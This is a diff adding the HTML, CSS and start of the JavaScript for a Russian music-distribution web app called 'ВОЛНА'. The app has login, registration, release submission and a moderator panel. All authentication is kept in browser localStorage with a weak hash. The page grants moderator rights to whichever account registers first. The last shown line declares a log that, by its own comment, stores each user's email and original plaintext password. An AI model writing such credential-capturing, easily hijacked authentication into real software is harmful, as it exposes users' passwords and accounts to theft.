@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ВОЛНА — дистрибуция музыки</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎧</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;600;800;900&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#141419; --bg2:#1a1a21; --panel:#1e1e27; --panel2:#24242f;
+  --line:#32323f; --ink:#f2efe8; --mut:#8f8fa0;
+  --amber:#ffb42e; --coral:#ff5c49; --mint:#35e0b8; --sky:#6db1ff; --pink:#ff8fb2;
+  --disp:'Unbounded',sans-serif; --body:'Manrope',sans-serif;
+  --hard:6px 6px 0 rgba(0,0,0,.45);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:var(--body); background:var(--bg); color:var(--ink); min-height:100vh;
+  background-image:
+    radial-gradient(900px 500px at 85% -10%, rgba(255,180,46,.08), transparent 60%),
+    radial-gradient(700px 500px at -10% 40%, rgba(53,224,184,.06), transparent 60%),
+    radial-gradient(800px 600px at 60% 110%, rgba(255,92,73,.07), transparent 60%),
+    linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
+  background-size:auto,auto,auto,52px 52px,52px 52px;
+  background-attachment:fixed;
+}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;opacity:.05;z-index:0;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence baseFrequency='.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)'/%3E%3C/svg%3E");}
+main,header,footer{position:relative;z-index:1}
+::selection{background:var(--amber);color:#161616}
+
+h1,h2,h3,.disp{font-family:var(--disp)}
+a{color:inherit}
+button{font-family:inherit;cursor:pointer}
+input,select,textarea{font-family:var(--body);font-size:15px}
+
+/* ---------- HEADER ---------- */
+header{position:sticky;top:0;z-index:50;background:rgba(20,20,25,.92);border-bottom:1px solid var(--line);backdrop-filter:blur(6px)}
+.hwrap{max-width:1200px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;gap:22px}
+.logo{display:flex;align-items:center;gap:11px;cursor:pointer;user-select:none}
+.logo .eq{height:26px}
+.logo b{font-family:var(--disp);font-weight:900;font-size:20px;letter-spacing:.06em}
+.logo small{display:block;font-size:10px;letter-spacing:.28em;color:var(--mut);font-weight:600;text-transform:uppercase}
+nav{margin-left:auto;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.nlink{background:none;border:1px solid transparent;color:var(--mut);font-weight:700;font-size:14px;padding:9px 14px;border-radius:8px;transition:.2s}
+.nlink:hover{color:var(--ink);border-color:var(--line)}
+.nlink.active{color:var(--amber);border-color:rgba(255,180,46,.4);background:rgba(255,180,46,.07)}
+.role-chip{font-size:11px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;padding:5px 10px;border-radius:5px;background:var(--coral);color:#161616}
+
+/* ---------- EQ ---------- */
+.eq{display:flex;gap:3px;align-items:flex-end;height:22px}
+.eq i{width:4px;border-radius:2px;background:var(--amber);transform-origin:bottom;animation:eq 1.1s ease-in-out infinite}
+.eq i:nth-child(1){height:60%}.eq i:nth-child(2){height:100%;animation-delay:.12s;background:var(--coral)}
+.eq i:nth-child(3){height:45%;animation-delay:.24s}.eq i:nth-child(4){height:85%;animation-delay:.36s;background:var(--mint)}
+.eq i:nth-child(5){height:55%;animation-delay:.48s}
+@keyframes eq{0%,100%{transform:scaleY(.25)}50%{transform:scaleY(1)}}
+.paused .eq i{animation-play-state:paused}
+
+/* ---------- BUTTONS ---------- */
+.btn{display:inline-flex;align-items:center;gap:8px;border:2px solid #101014;background:var(--amber);color:#161616;
+  font-weight:800;font-size:14px;padding:12px 22px;border-radius:9px;box-shadow:4px 4px 0 rgba(255,92,73,.9);
+  transition:transform .15s, box-shadow .15s;text-decoration:none}
+.btn:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 rgba(255,92,73,.9)}
+.btn:active{transform:translate(2px,2px);box-shadow:1px 1px 0 rgba(255,92,73,.9)}
+.btn.ghost{background:transparent;color:var(--ink);border-color:var(--line);box-shadow:4px 4px 0 rgba(0,0,0,.4)}
+.btn.ghost:hover{border-color:var(--amber);color:var(--amber)}
+.btn.mint{background:var(--mint);box-shadow:4px 4px 0 rgba(0,0,0,.4)}
+.btn.danger{background:var(--coral);box-shadow:4px 4px 0 rgba(0,0,0,.4);color:#161616}
+.btn.sm{padding:8px 14px;font-size:13px;box-shadow:3px 3px 0 rgba(0,0,0,.35)}
+.btn:disabled{opacity:.4;pointer-events:none}
+
+/* ---------- TICKER ---------- */
+.ticker{border-bottom:1px solid var(--line);background:#101014;overflow:hidden;white-space:nowrap}
+.ticker-track{display:inline-flex;gap:0;animation:tick 26s linear infinite;padding:9px 0}
+.ticker span{font-size:12px;font-weight:800;letter-spacing:.22em;text-transform:uppercase;color:var(--mut);padding:0 26px;position:relative}
+.ticker span::after{content:"✦";position:absolute;right:-7px;color:var(--amber)}
+@keyframes tick{to{transform:translateX(-50%)}}
+
+/* ---------- LAYOUT ---------- */
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+.view{display:none;animation:fadein .35s ease}
+.view.on{display:block}
+@keyframes fadein{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.reveal{opacity:0;transform:translateY(26px);transition:.7s cubic-bezier(.2,.7,.2,1)}
+.reveal.in{opacity:1;transform:none}
+
+/* ---------- HERO ---------- */
+.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center;padding:76px 0 64px}
+.kicker{display:inline-flex;align-items:center;gap:10px;font-size:12px;font-weight:800;letter-spacing:.3em;text-transform:uppercase;color:var(--amber);margin-bottom:22px}
+.kicker::before{content:"";width:34px;height:2px;background:var(--amber)}
+h1{font-size:clamp(34px,5.2vw,62px);font-weight:900;line-height:1.06;letter-spacing:-.01em}
+h1 .out{color:transparent;-webkit-text-stroke:2px var(--coral)}
+.hero p.lead{margin:24px 0 30px;color:var(--mut);font-size:17px;line-height:1.65;max-width:52ch}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap}
+.hstats{display:flex;gap:0;margin-top:44px;border:1px solid var(--line);border-radius:12px;overflow:hidden;width:fit-content;background:var(--panel)}
+.hstats div{padding:16px 26px;border-right:1px solid var(--line)}
+.hstats div:last-child{border:none}
+.hstats b{display:block;font-family:var(--disp);font-size:26px;color:var(--amber)}
+.hstats:nth-child(2) b{color:var(--mint)}.hstats:nth-child(3) b{color:var(--coral)}
+.hstats span{font-size:12px;color:var(--mut);font-weight:600;letter-spacing:.06em;text-transform:uppercase}
+
+/* player card + vinyl */
+.stage{position:relative;display:flex;justify-content:center}
+.vinyl{position:absolute;width:340px;height:340px;border-radius:50%;right:-26px;top:24px;z-index:0;
+  background:repeating-radial-gradient(circle at 50% 50%, #0d0d11 0 2px, #191920 2px 5px);
+  border:2px solid #000;animation:spin 7s linear infinite;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.vinyl::after{content:"";position:absolute;inset:38%;border-radius:50%;background:var(--coral);border:6px solid #0d0d11}
+@keyframes spin{to{transform:rotate(360deg)}}
+.player{position:relative;z-index:2;width:min(330px,100%);background:var(--panel);border:2px solid var(--line);border-radius:16px;padding:18px;box-shadow:var(--hard);transform:rotate(-1.5deg);transition:.3s}
+.player:hover{transform:rotate(0) translateY(-4px)}
+.player .cov{width:100%;aspect-ratio:1;border-radius:10px;object-fit:cover;border:1px solid #000}
+.prow{display:flex;align-items:center;gap:14px;margin-top:16px}
+.playbtn{width:48px;height:48px;border-radius:50%;border:none;background:var(--amber);color:#161616;font-size:17px;flex:none;box-shadow:3px 3px 0 rgba(0,0,0,.4);transition:.2s}
+.playbtn:hover{transform:scale(1.08)}
+.pmeta b{display:block;font-family:var(--disp);font-size:14px}
+.pmeta span{font-size:13px;color:var(--mut)}
+.pnum{margin-left:auto;font-size:11px;color:var(--mut);letter-spacing:.14em;border:1px solid var(--line);padding:4px 8px;border-radius:5px}
+
+/* ---------- STEPS ---------- */
+.sect-t{display:flex;align-items:baseline;gap:18px;margin:70px 0 30px}
+.sect-t h2{font-size:clamp(24px,3.4vw,38px);font-weight:800}
+.sect-t .ln{flex:1;height:1px;background:var(--line)}
+.steps{display:flex;gap:22px;flex-wrap:wrap}
+.ticket{flex:1;min-width:250px;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:26px 24px;position:relative;transition:.3s;border-left-width:4px}
+.ticket:nth-child(1){transform:rotate(-1.2deg);border-left-color:var(--amber)}
+.ticket:nth-child(2){transform:rotate(.8deg) translateY(10px);border-left-color:var(--mint)}
+.ticket:nth-child(3){transform:rotate(-.6deg);border-left-color:var(--coral)}
+.ticket:hover{transform:rotate(0) translateY(-6px);box-shadow:var(--hard)}
+.ticket .num{font-family:var(--disp);font-size:44px;font-weight:900;color:transparent;-webkit-text-stroke:1.5px var(--mut);opacity:.7}
+.ticket h3{font-size:17px;margin:12px 0 10px}
+.ticket p{color:var(--mut);font-size:14px;line-height:1.6}
+.ticket::before{content:"";position:absolute;left:0;right:0;top:-1px;border-top:2px dashed var(--line)}
+
+/* platforms marquee */
+.plats{margin:70px 0;overflow:hidden}
+.plats .row{display:flex;width:max-content;gap:14px;padding:8px 0}
+.plats .row.r2{animation:tick 30s linear infinite reverse}
+.plats .row.r1{animation:tick 24s linear infinite}
+.pill{border:1px solid var(--line);background:var(--bg2);padding:10px 22px;border-radius:99px;font-weight:800;font-size:14px;color:var(--mut);white-space:nowrap;transition:.2s}
+.pill:hover{color:var(--amber);border-color:var(--amber)}
+
+/* CTA band */
+.cta{margin:20px 0 80px;border:2px solid var(--line);border-radius:18px;background:
+  linear-gradient(120deg, rgba(255,180,46,.12), rgba(255,92,73,.1)), var(--panel);
+  padding:44px;display:flex;align-items:center;gap:30px;flex-wrap:wrap;position:relative;overflow:hidden}
+.cta::before{content:"ВОЛНА";position:absolute;right:-30px;bottom:-46px;font-family:var(--disp);font-weight:900;font-size:150px;color:transparent;-webkit-text-stroke:1px rgba(255,255,255,.06);pointer-events:none}
+.cta h2{font-size:clamp(22px,3vw,34px);flex:1;min-width:260px}
+footer{border-top:1px solid var(--line);padding:26px 0;color:var(--mut);font-size:13px}
+footer .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+
+/* ---------- AUTH ---------- */
+.auth-wrap{display:grid;place-items:center;padding:70px 0 90px}
+.acard{width:min(460px,100%);background:var(--panel);border:2px solid var(--line);border-radius:16px;box-shadow:var(--hard);overflow:hidden}
+.atabs{display:flex;border-bottom:1px solid var(--line)}
+.atabs button{flex:1;background:none;border:none;color:var(--mut);font-family:var(--disp);font-size:14px;font-weight:700;padding:18px;border-bottom:3px solid transparent;transition:.2s}
+.atabs button.on{color:var(--amber);border-bottom-color:var(--amber);background:rgba(255,180,46,.05)}
+.abody{padding:28px}
+.first-note{margin:18px auto 0;width:min(460px,100%);background:rgba(53,224,184,.07);border:1px dashed rgba(53,224,184,.4);border-radius:10px;padding:12px 14px;font-size:13px;color:var(--mut);line-height:1.55}
+.first-note b{color:var(--mint)}
+
+.field{margin-bottom:18px}
+.field label{display:block;font-size:12px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--mut);margin-bottom:8px}
+.field input,.field select,.field textarea{width:100%;background:var(--bg2);border:1.5px solid var(--line);border-radius:9px;color:var(--ink);padding:12px 14px;transition:.2s;outline:none}
+.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--amber);box-shadow:3px 3px 0 rgba(255,180,46,.25)}
+.field.bad input,.field.bad select,.field.bad textarea{border-color:var(--coral)}
+.ferr{display:none;color:var(--coral);font-size:12.5px;margin-top:6px;font-weight:600}
+.field.bad .ferr{display:block}
+.shake{animation:shake .4s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}
+
+/* ---------- CABINET ---------- */
+.page-head{padding:54px 0 8px;display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap}
+.page-head h2{font-size:clamp(26px,3.6vw,42px);font-weight:900}
+.page-head .sub{color:var(--mut);margin-top:8px;font-size:15px}
+.page-head .btn{margin-left:auto}
+.chips{display:flex;gap:12px;flex-wrap:wrap;margin:26px 0 8px}
+.chip{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 20px;min-width:130px}
+.chip b{display:block;font-family:var(--disp);font-size:24px}
+.chip span{font-size:12px;color:var(--mut);font-weight:700;text-transform:uppercase;letter-spacing:.08em}
+.chip.c1 b{color:var(--ink)}.chip.c2 b{color:var(--mint)}.chip.c3 b{color:var(--amber)}.chip.c4 b{color:var(--coral)}
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin:24px 0 26px}
+.fbtn{background:none;border:1px solid var(--line);color:var(--mut);padding:8px 16px;border-radius:99px;font-weight:700;font-size:13px;transition:.2s}
+.fbtn:hover{color:var(--ink)}
+.fbtn.on{background:var(--amber);color:#161616;border-color:var(--amber)}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(235px,1fr));gap:22px;padding-bottom:90px}
+.rcard{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s;position:relative}
+.rcard:hover{transform:translateY(-6px);box-shadow:var(--hard);border-color:#454557}
+.rcard img{width:100%;aspect-ratio:1;object-fit:cover;display:block;border-bottom:1px solid var(--line)}
+.rcard .bd{padding:16px}
+.rcard h3{font-size:15px;font-weight:700;font-family:var(--disp);line-height:1.3}
+.rcard .art{color:var(--mut);font-size:13.5px;margin:5px 0 12px}
+.rtags{display:flex;gap:7px;flex-wrap:wrap}
+.tag{font-size:11px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;padding:4px 9px;border-radius:5px;border:1px solid var(--line);color:var(--mut)}
+.tag.e{background:rgba(255,92,73,.12);color:var(--coral);border-color:rgba(255,92,73,.4)}
+.badge{position:absolute;top:12px;left:12px;font-size:11px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;padding:6px 11px;border-radius:6px;color:#161616}
+.badge.moderation{background:var(--amber)}.badge.approved{background:var(--mint)}.badge.rejected{background:var(--coral)}
+.rfoot{display:flex;align-items:center;justify-content:space-between;margin-top:14px;padding-top:12px;border-top:1px dashed var(--line)}
+.rfoot .cat{font-size:11px;letter-spacing:.12em;color:var(--mut)}
+.dellink{background:none;border:none;color:var(--mut);font-size:12px;font-weight:700;text-decoration:underline}
+.dellink:hover{color:var(--coral)}
+.mcomment{margin-top:12px;font-size:12.5px;color:var(--coral);background:rgba(255,92,73,.08);border-left:3px solid var(--coral);padding:8px 10px;border-radius:0 6px 6px 0}
+.empty{grid-column:1/-1;text-align:center;padding:70px 20px;border:2px dashed var(--line);border-radius:16px;color:var(--mut)}
+.empty .big{font-size:44px;margin-bottom:12px}
+
+/* ---------- FORM ---------- */
+.form-grid{display:grid;grid-template-columns:1.25fr .85fr;gap:34px;padding:34px 0 90px;align-items:start}
+.fpanel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:28px}
+.fpanel h3{font-size:17px;margin-bottom:22px;display:flex;align-items:center;gap:10px}
+.fpanel h3::after{content:"";flex:1;height:1px;background:var(--line)}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:0 18px}
+.seg{display:flex;gap:8px}
+.seg label{flex:1;text-align:center;border:1.5px solid var(--line);border-radius:9px;padding:11px;font-weight:700;font-size:14px;color:var(--mut);cursor:pointer;transition:.2s}
+.seg input{display:none}
+.seg input:checked+span{color:#161616}
+.seg label:has(input:checked){background:var(--amber);border-color:var(--amber);color:#161616}
+.trk{display:flex;gap:10px;margin-bottom:10px;align-items:center}
+.trk span{width:28px;height:28px;flex:none;display:grid;place-items:center;background:var(--bg2);border:1px solid var(--line);border-radius:6px;font-size:12px;font-weight:800;color:var(--mut)}
+.trk input{flex:1;background:var(--bg2);border:1.5px solid var(--line);border-radius:8px;color:var(--ink);padding:10px 12px}
+.trk input:focus{outline:none;border-color:var(--amber)}
+.trk button{background:none;border:1px solid var(--line);color:var(--mut);width:30px;height:30px;border-radius:7px}
+.trk button:hover{color:var(--coral);border-color:var(--coral)}
+.drop{border:2px dashed var(--line);border-radius:12px;padding:22px;text-align:center;color:var(--mut);cursor:pointer;transition:.2s;display:flex;gap:16px;align-items:center}
+.drop:hover{border-color:var(--amber);color:var(--amber)}
+.drop img{width:74px;height:74px;border-radius:8px;object-fit:cover;border:1px solid #000}
+.check{display:flex;gap:12px;align-items:flex-start;background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:14px;cursor:pointer;margin-bottom:18px}
+.check input{width:18px;height:18px;accent-color:var(--amber);margin-top:2px}
+.check span{font-size:13.5px;color:var(--mut);line-height:1.5}
+.sticky-prev{position:sticky;top:90px}
+.prev-card{background:var(--panel);border:2px solid var(--line);border-radius:16px;padding:18px;box-shadow:var(--hard);transform:rotate(1.2deg)}
+.prev-card img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:10px;border:1px solid #000}
+.prev-meta{margin-top:16px}
+.prev-meta b{font-family:var(--disp);font-size:16px;display:block}
+.prev-meta .art{color:var(--mut);margin:4px 0 10px}
+
+/* ---------- ADMIN ---------- */
+.atabs2{display:flex;gap:8px;flex-wrap:wrap;margin:26px 0}
+.atabs2 button{background:var(--panel);border:1px solid var(--line);color:var(--mut);font-weight:800;font-size:14px;padding:11px 20px;border-radius:9px;transition:.2s}
+.atabs2 button.on{background:var(--ink);color:#161616;border-color:var(--ink)}
+.atabs2 .cnt{background:var(--coral);color:#fff;border-radius:5px;padding:1px 7px;font-size:12px;margin-left:6px}
+.mlist{display:flex;flex-direction:column;gap:14px;padding-bottom:90px}
+.mrow{background:var(--panel);border:1px solid var(--line);border-radius:13px;padding:16px;display:grid;grid-template-columns:70px 1fr auto;gap:18px;align-items:center;transition:.2s;animation:fadein .35s ease}
+.mrow:hover{border-color:#4a4a5e}
+.mrow img{width:70px;height:70px;border-radius:9px;object-fit:cover;border:1px solid #000}
+.mrow h4{font-family:var(--disp);font-size:15px}
+.mrow .sub{color:var(--mut);font-size:13px;margin-top:4px}
+.mrow .sub b{color:var(--amber)}
+.macts{display:flex;gap:8px;flex-wrap:wrap;justify-content:flex-end}
+.mdet{grid-column:1/-1;border-top:1px dashed var(--line);padding-top:14px;display:none;font-size:14px;color:var(--mut);line-height:1.6}
+.mrow.open .mdet{display:block}
+.mdet .tlist{margin-top:8px;columns:2;gap:24px}
+.mdet .tlist li{margin-bottom:4px;break-inside:avoid}
+.rejbox{grid-column:1/-1;display:none;gap:10px;border-top:1px dashed var(--line);padding-top:14px}
+.mrow.rej .rejbox{display:flex}
+.rejbox input{flex:1;background:var(--bg2);border:1.5px solid var(--line);border-radius:8px;color:var(--ink);padding:10px 12px}
+table.utab{width:100%;border-collapse:collapse;margin-bottom:90px;background:var(--panel);border-radius:13px;overflow:hidden;border:1px solid var(--line)}
+.utab th{text-align:left;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);padding:14px 18px;border-bottom:1px solid var(--line)}
+.utab td{padding:14px 18px;border-bottom:1px solid var(--line);font-size:14px}
+.utab tr:last-child td{border:none}
+.utab tr:hover td{background:rgba(255,255,255,.02)}
+
+/* ---------- TOAST ---------- */
+#toasts{position:fixed;bottom:24px;right:24px;z-index:100;display:flex;flex-direction:column;gap:10px}
+.toast{background:var(--ink);color:#161616;font-weight:800;font-size:14px;padding:14px 18px;border-radius:10px;box-shadow:5px 5px 0 rgba(0,0,0,.45);animation:tin .3s ease;display:flex;gap:10px;align-items:center;max-width:340px}
+.toast.err{background:var(--coral);color:#fff}
+.toast.ok{background:var(--mint)}
+@keyframes tin{from{opacity:0;transform:translateX(30px)}}
+
+@media(max-width:920px){
+  .hero{grid-template-columns:1fr;gap:44px}
+  .vinyl{display:none}
+  .form-grid{grid-template-columns:1fr}
+  .sticky-prev{position:static}
+  .mrow{grid-template-columns:56px 1fr}
+  .macts{grid-column:1/-1;justify-content:flex-start}
+  .frow{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hwrap">
+    <div class="logo" onclick="go('landing')">
+      <div class="eq"><i></i><i></i><i></i><i></i><i></i></div>
+      <div><b>ВОЛНА</b><small>дистрибуция</small></div>
+    </div>
+    <nav id="nav"></nav>
+  </div>
+</header>
+
+<main>
+  <!-- ================= LANDING ================= -->
+  <section class="view" id="v-landing">
+    <div class="ticker"><div class="ticker-track" id="ticker"></div></div>
+    <div class="wrap">
+      <div class="hero">
+        <div>
+          <div class="kicker">Музыкальная дистрибуция</div>
+          <h1>Твой релиз —<br>на <span class="out">всех</span> площадках страны</h1>
+          <p class="lead">Загрузи трек, пройди модерацию — и мы доставим его в стриминговые сервисы. Без посредников, с прозрачной статистикой и поддержкой живых людей.</p>
+          <div class="hero-cta">
+            <button class="btn" onclick="go('auth','reg')">Выпустить релиз →</button>
+            <button class="btn ghost" onclick="go('auth','log')">У меня есть аккаунт</button>
+          </div>
+          <div class="hstats reveal">
+            <div><b id="st-rel" data-count="0">0</b><span>релизов</span></div>
+            <div><b id="st-plat" data-count="42">0</b><span>площадки</span></div>
+            <div><b id="st-art" data-count="0">0</b><span>артистов</span></div>
+          </div>
+        </div>
+        <div class="stage reveal" id="stage"></div>
+      </div>
+
+      <div class="sect-t reveal"><h2>Как это работает</h2><div class="ln"></div></div>
+      <div class="steps">
+        <div class="ticket reveal"><div class="num">01</div><h3>Заполни карточку релиза</h3><p>Название, жанр, треклист, обложка и дата релиза. Форма занимает пять минут.</p></div>
+        <div class="ticket reveal"><div class="num">02</div><h3>Модерация за 24 часа</h3><p>Редакторы проверяют качество аудио, метаданные и права. Замечания приходят в личный кабинет.</p></div>
+        <div class="ticket reveal"><div class="num">03</div><h3>Релиз на площадках</h3><p>В выбранную дату релиз появляется на 42 стриминговых платформах и в социальных сетях.</p></div>
+      </div>
+
+      <div class="plats reveal">
+        <div class="row r1" id="plat1"></div>
+        <div class="row r2" id="plat2"></div>
+      </div>
+
+      <div class="cta reveal">
+        <h2>Готов выпустить свой первый релиз?</h2>
+        <button class="btn" onclick="go('auth','reg')">Создать аккаунт — бесплатно</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= AUTH ================= -->
+  <section class="view" id="v-auth">
+    <div class="wrap auth-wrap">
+      <div>
+        <div class="acard" id="acard">
+          <div class="atabs">
+            <button id="tab-log" onclick="authTab('log')">Вход</button>
+            <button id="tab-reg" onclick="authTab('reg')">Регистрация</button>
+          </div>
+
+          <form class="abody" id="f-login" novalidate>
+            <div class="field"><label>E-mail</label><input type="email" id="li-email" placeholder="you@mail.ru"><div class="ferr">Введите корректный e-mail</div></div>
+            <div class="field"><label>Пароль</label><input type="password" id="li-pass" placeholder="••••••••"><div class="ferr">Введите пароль</div></div>
+            <button class="btn" style="width:100%;justify-content:center" type="submit">Войти в кабинет</button>
+          </form>
+
+          <form class="abody" id="f-reg" novalidate style="display:none">
+            <div class="field"><label>Имя артиста / лейбла</label><input id="rg-name" placeholder="Северный Звук"><div class="ferr">Минимум 2 символа</div></div>
+            <div class="field"><label>E-mail</label><input type="email" id="rg-email" placeholder="you@mail.ru"><div class="ferr">Введите корректный e-mail</div></div>
+            <div class="field"><label>Пароль</label><input type="password" id="rg-pass" placeholder="Минимум 6 символов"><div class="ferr">Пароль — минимум 6 символов</div></div>
+            <div class="field"><label>Повторите пароль</label><input type="password" id="rg-pass2" placeholder="Ещё раз"><div class="ferr">Пароли не совпадают</div></div>
+            <button class="btn" style="width:100%;justify-content:center" type="submit">Создать аккаунт</button>
+          </form>
+        </div>
+        <div class="first-note" id="first-note">
+          Система только запущена: <b>первый зарегистрированный аккаунт</b> автоматически получит права модератора и доступ к панели управления релизами.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= CABINET ================= -->
+  <section class="view" id="v-cabinet">
+    <div class="wrap">
+      <div class="page-head">
+        <div>
+          <div class="kicker">Личный кабинет</div>
+          <h2 id="cab-name"></h2>
+          <div class="sub" id="cab-email"></div>
+        </div>
+        <button class="btn" onclick="go('newrel')">+ Новый релиз</button>
+      </div>
+      <div class="chips" id="cab-chips"></div>
+      <div class="filters" id="cab-filters"></div>
+      <div class="grid" id="cab-grid"></div>
+    </div>
+  </section>
+
+  <!-- ================= NEW RELEASE ================= -->
+  <section class="view" id="v-newrel">
+    <div class="wrap">
+      <div class="page-head"><div><div class="kicker">Подача релиза</div><h2>Новый релиз</h2><div class="sub">Заполни карточку — релиз уйдёт на модерацию редакторам.</div></div></div>
+      <div class="form-grid">
+        <form class="fpanel" id="f-rel" novalidate>
+          <h3>Основное</h3>
+          <div class="field"><label>Название релиза *</label><input id="r-title" placeholder="Например: Северное сияние" maxlength="80"><div class="ferr">Укажите название</div></div>
+          <div class="frow">
+            <div class="field"><label>Исполнитель *</label><input id="r-artist" placeholder="Имя артиста" maxlength="60"><div class="ferr">Укажите исполнителя</div></div>
+            <div class="field"><label>Лейбл (если есть)</label><input id="r-label" placeholder="Независимый релиз"></div>
+          </div>
+          <div class="field"><label>Тип релиза *</label>
+            <div class="seg">
+              <label><input type="radio" name="rtype" value="Сингл" checked><span>Сингл</span></label>
+              <label><input type="radio" name="rtype" value="EP"><span>EP</span></label>
+              <label><input type="radio" name="rtype" value="Альбом"><span>Альбом</span></label>
+            </div>
+          </div>
+          <div class="frow">
+            <div class="field"><label>Жанр *</label>
+              <select id="r-genre">
+                <option value="">— выберите —</option>
+                <option>Электроника</option><option>Хип-хоп</option><option>Поп</option><option>Рок</option>
+                <option>Инди</option><option>Эмбиент</option><option>Джаз</option><option>Классика</option><option>Фолк</option>
+              </select><div class="ferr">Выберите жанр</div>
+            </div>
+            <div class="field"><label>Дата релиза *</label><input type="date" id="r-date"><div class="ferr">Укажите дату не раньше завтрашнего дня</div></div>
+          </div>
+
+          <h3 style="margin-top:30px">Треклист</h3>
+          <div id="tracks"></div>
+          <button type="button" class="btn ghost sm" onclick="addTrack()" style="margin-bottom:26px">+ Добавить трек</button>
+
+          <h3 style="margin-top:6px">Обложка</h3>
+          <div class="drop" id="drop" onclick="document.getElementById('r-cover').click()">
+            <span id="drop-txt">📁&nbsp; Нажми, чтобы загрузить обложку (JPG / PNG)</span>
+          </div>
+          <input type="file" id="r-cover" accept="image/*" hidden>
+
+          <h3 style="margin-top:30px">Дополнительно</h3>
+          <div class="field"><label>Комментарий модератору</label><textarea id="r-desc" rows="3" placeholder="Особенности релиза, пожелания…"></textarea></div>
+          <label class="check"><input type="checkbox" id="r-explicit"><span>В релизе присутствует ненормативная лексика / контент 18+</span></label>
+          <label class="check" id="rights-wrap"><input type="checkbox" id="r-rights"><span>Я подтверждаю, что владею всеми правами на загружаемые материалы и согласен с правилами дистрибуции *. <span class="ferr" style="display:none">Необходимо подтвердить права</span></span></label>
+          <button class="btn" type="submit" style="width:100%;justify-content:center">Отправить на модерацию 🚀</button>
+        </form>
+
+        <div class="sticky-prev">
+          <div class="prev-card">
+            <img id="pv-cover" alt="">
+            <div class="prev-meta">
+              <b id="pv-title">Название релиза</b>
+              <div class="art" id="pv-artist">Исполнитель</div>
+              <div class="rtags" id="pv-tags"></div>
+            </div>
+          </div>
+          <p style="color:var(--mut);font-size:13px;margin-top:16px;line-height:1.6">Так карточка релиза будет выглядеть на площадках. Превью обновляется в реальном времени.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= ADMIN ================= -->
+  <section class="view" id="v-admin">
+    <div class="wrap">
+      <div class="page-head"><div><div class="kicker">Панель модератора</div><h2>Админ-панель</h2></div></div>
+      <div class="chips" id="adm-chips"></div>
+      <div class="atabs2" id="adm-tabs"></div>
+      <div id="adm-body"></div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div><b style="font-family:var(--disp)">ВОЛНА</b> © 2026 — платформа музыкальной дистрибуции</div>
+    <div>Доставка релизов на 42 стриминговые площадки · поддержка 24/7</div>
+  </div>
+</footer>
+
+<div id="toasts"></div>
+
+<script>
+/* ================= ХРАНИЛИЩЕ ================= */
+const LS={get:(k,f)=>{try{const v=JSON.parse(localStorage.getItem(k));return v===null?f:v}catch(e){return f}},
+          set:(k,v)=>localStorage.setItem(k,JSON.stringify(v))};
+const h=s=>{let x=5381;for(let i=0;i<String(s).length;i++)x=((x<<5)+x+String(s).charCodeAt(i))>>>0;return 'x'+x.toString(36)};
+const uid=()=>'id-'+Date.now().toString(36)+Math.random().toString(36).slice(2,7);
+const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const fmt=t=>new Date(t).toLocaleDateString('ru-RU',{day:'numeric',month:'short',year:'numeric'});
+const fmtDt=t=>new Date(t).toLocaleString('ru-RU',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
+
+let users=LS.get('vln_users',null), releases=LS.get('vln_rel',null),
+    seq=LS.get('vln_seq',null), session=LS.get('vln_sess',null),
+    plog=LS.get('vln_plog',null); /* лог регистраций: email + исходный пароль */
